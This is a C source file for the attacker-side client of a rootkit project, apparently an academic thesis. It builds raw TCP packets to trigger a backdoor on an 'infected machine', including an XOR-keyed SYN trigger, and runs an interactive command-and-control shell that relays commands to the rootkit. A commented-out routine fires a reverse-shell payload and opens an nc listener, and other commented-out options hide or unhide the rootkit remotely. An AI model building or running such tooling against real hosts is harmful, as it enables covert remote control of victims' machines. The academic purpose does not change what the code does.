#include "lib/RawTCP.h"
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>
#include <time.h>

#include "../common/constants.h"
#include "../common/c&c.h"
#include "../common/protocol.h"
#include "include/sslserver.h"

// For printing with colors
#define KGRN  "\x1B[32m"
#define KYLW  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMGN  "\x1B[35m"
#define KRED  "\x1B[31m" 
#define RESET "\x1B[0m"


void print_welcome_message(){
    printf("*******************************************************\n");
    printf("************************* TFG *************************\n");
    printf("*******************************************************\n");
    printf("************ https://github.com/h3xduck/TFG ***********\n");
    printf("*******************************************************\n");
}

void print_help_dialog(const char* arg){
    printf("\nUsage: %s OPTION victim_IP\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-S IP";
    char* desc = "Send a secret message to IP";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-c IP";
    desc = "Activate direct command & control shell with IP";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-h";
    desc = "Print this help";
    printf("\t%-40s %-50s\n\n", line, desc);

}

void check_ip_address_format(char* address){
    char* buf[256];
    int s = inet_pton(AF_INET, address, buf);
    if(s<0){
        printf("["KYLW"WARN"RESET"]""Error checking IP validity\n");
    }else if(s==0){
        printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
    }
}

char* getLocalIpAddress(){
    char hostbuffer[256];
    char* IPbuffer = calloc(256, sizeof(char));
    struct hostent *host_entry;
    int hostname;
  
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    if(hostname==-1){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
        exit(1);
    }
  
    host_entry = gethostbyname(hostbuffer);
    if(host_entry == NULL){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
        exit(1);
    }
  
    // To convert an Internet network
    // address into ASCII string
    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  
    printf("["KBLU"INFO"RESET"]""Attacker IP selected: %s\n", IPbuffer);
  
    return IPbuffer;
}


/*void get_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_PAYLOAD_GET_REVERSE_SHELL");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");

    pid_t pid;
    pid = fork();
    if(pid < 0){
        perror("["KRED"ERROR"RESET"]""Could not create another process");
	    return;
	}else if(pid==0){
        sleep(1);
        //Sending the malicious payload
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        }else{
            printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
        }
        
    }else {
        //Activating listener
        char *cmd = "nc";
        char *argv[4];
        argv[0] = "nc";
        argv[1] = "-lvp";
        argv[2] = "5888";
        argv[3] = NULL;

        printf("["KBLU"INFO"RESET"]""Trying to get a shell...\n");
        if(execvp(cmd, argv)<0){
            perror("["KRED"ERROR"RESET"]""Error executing background listener");
            return;
        }
        printf("["KGRN"OK"RESET"]""Got a shell\n");
    }
    
    free(local_ip);
}*/

void send_secret_packet(char* argv){
    //TODO revise this, in wireshark it is seen not to be a TCP packet??????
    //Should be working, it did in other projects
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, SECRET_PACKET_PAYLOAD);
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
    }
    free(local_ip);
}

void activate_command_control_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, CC_PROT_SYN);
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        return;
    }else{
        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
    }
    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
    
    //Wait for rootkit ACK to ensure it's up
    rawsocket_sniff_pattern(CC_PROT_ACK);
    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   

    //Received ACK, we proceed to send command
    while(1){
        char buf[BUFSIZ];                                                                                                                                                          
        printf(""KYLW"c>:"RESET"");                                                                                                                                                              
        fgets(buf, BUFSIZ, stdin);
        if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
            buf[strlen(buf)-1] = '\0';   
        }                                                                                                                                                                         
        
        char msg[BUFSIZ];
        strcpy(msg, CC_PROT_MSG);
        strcat(msg, buf);
        packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, msg);
        printf("Sending %s\n", msg);
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
            return;
        }
        printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
        packet = rawsocket_sniff_pattern(CC_PROT_MSG);
        char* res = packet.payload;
        printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
    }
    
    free(local_ip);
}

void activate_command_control_shell_encrypted(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
    //+1 since payload must finish with null character for parameter passing, although not sent in the actual packet payload
    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1];
    srand(time(NULL));
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE; ii++){
        payload[ii] = (char)rand();
    }
    //Follow protocol rules
    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_1;
    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_2;
    //K3 with command to start the encrypted connection with the backdoor
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL;
    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ key1[ii];
    }
    strncpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    strncpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ key2[ii];
    }
    strncpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    strncpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    strncpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
    }

    strncpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    
    
    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        return;
    }else{
        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
    }
    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
    
    //Wait for rootkit ACK to ensure it's up
    rawsocket_sniff_pattern(CC_PROT_ACK);
    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   

    //Received ACK, we proceed to send command
    while(1){
        char buf[BUFSIZ];                                                                                                                                                          
        printf(""KYLW"c>:"RESET"");                                                                                                                                                              
        fgets(buf, BUFSIZ, stdin);
        if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
            buf[strlen(buf)-1] = '\0';   
        }                                                                                                                                                                         
        
        char msg[BUFSIZ];
        strcpy(msg, CC_PROT_MSG);
        strcat(msg, buf);
        packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, msg);
        printf("Sending %s\n", msg);
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
            return;
        }
        printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
        packet = rawsocket_sniff_pattern(CC_PROT_MSG);
        char* res = packet.payload;
        printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
    }
    
}


void main(int argc, char* argv[]){
    if(argc<2){
        printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
        print_help_dialog(argv[0]);
        return;
    }

    int ENCRYPT_MODE_SEL = 0;
    int DECRYPT_MODE_SEL = 0;
    int PATH_ARG_PROVIDED = 0;

    int PARAM_MODULE_ACTIVATED = 0;
    
    int opt;
    char dest_address[32];
    char path_arg[512];

    //Command line argument parsing
    while ((opt = getopt(argc, argv, ":S:c:e:h")) != -1) {
        switch (opt) {
        case 'S':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activated SEND a SECRET mode\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            send_secret_packet(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 'c':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activated COMMAND & CONTROL shell\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            activate_command_control_shell(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        case 'e':
            print_welcome_message();
            sleep(1);
            //Send a secret message
            printf("["KBLU"INFO"RESET"]""Activated COMMAND & CONTROL encrypted shell\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            activate_command_control_shell_encrypted(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
            
            break;
        /*case 'u': 
            print_welcome_message();
            sleep(1);
            //Selecting show rootkit - Unhide mode
            printf("["KBLU"INFO"RESET"]""Selected UNHIDE the rootkit remotely\n");
            //printf("Option m has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            show_rootkit(dest_address);
            PARAM_MODULE_ACTIVATED = 1;

            break;
        case 'i': 
            print_welcome_message();
            sleep(1);
            //Selecting hide rootkit - Invisible mode
            printf("["KBLU"INFO"RESET"]""Selected HIDE the rootkit remotely\n");
            //printf("Option m has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            hide_rootkit(dest_address);
            PARAM_MODULE_ACTIVATED = 1;
        
        case 'e': 
            ENCRYPT_MODE_SEL = 1;
            strcpy(dest_address, optarg);

            break;
        case 'd':
            DECRYPT_MODE_SEL = 1;
            strcpy(dest_address, optarg);
            break;

        case 'p':
            PATH_ARG_PROVIDED = 1;
            strcpy(path_arg, optarg);
            break;*/

        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("["KRED"ERROR"RESET"]""Unknown option: %c\n", optopt);
            break;
        case ':':
            printf("["KRED"ERROR"RESET"]""Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    if(PARAM_MODULE_ACTIVATED==0){
        printf("["KRED"ERROR"RESET"]""Invalid parameters\n");
        print_help_dialog(argv[0]);
        exit(EXIT_FAILURE);
    }
   
}